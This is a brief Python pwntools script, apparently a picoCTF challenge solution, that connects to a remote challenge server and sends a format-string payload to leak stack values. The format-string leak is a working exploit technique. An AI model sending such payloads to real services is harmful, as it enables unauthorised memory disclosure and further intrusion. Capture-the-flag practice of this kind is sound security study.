#!/usr/bin/env python3
from pwn import *


io = remote("mimas.picoctf.net", 51283)


io.recvline()

io.sendline(b'%29$p,%30$p,%31$p,%32$p,%33$p,%34$p,AAAA')
print(io.recvline().decode())
print(io.recvline().decode())